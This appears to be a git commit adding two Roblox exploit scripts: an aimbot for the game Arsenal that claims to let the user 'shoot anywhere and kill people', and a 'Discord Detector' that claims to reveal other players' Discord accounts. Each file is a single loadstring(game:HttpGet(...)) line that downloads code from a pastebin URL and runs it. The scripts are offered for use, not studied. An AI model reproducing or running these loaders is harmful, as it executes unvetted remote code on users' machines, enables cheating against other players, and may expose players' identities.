3f18dfd598b1e3cdbf16580d77d0821109252416
SpedWill <78581783+SpedWill@users.noreply.github.com>
2021-03-05 11:21:21 -0800

    Add files via upload

---
+++ scripts/[Arsenal] Aimbot.lua
@@ -0,0 +1,7 @@
+--[[
+Made by lapada#0001
+Arsenal Aimbot (shoot anywhere and kill people)
+Usage: execute script, open console and verify it's loaded, shoot
+]]
+
+loadstring(game:HttpGet("https://pastebin.com/raw/XXsMmCy8", true))()
---
+++ scripts/[FE] Discord Detector.lua
@@ -0,0 +1,2 @@
+--press U on people and check their discords!!
+loadstring(game:HttpGet(('https://pastebin.com/raw/JsHeXYcM'),true))()
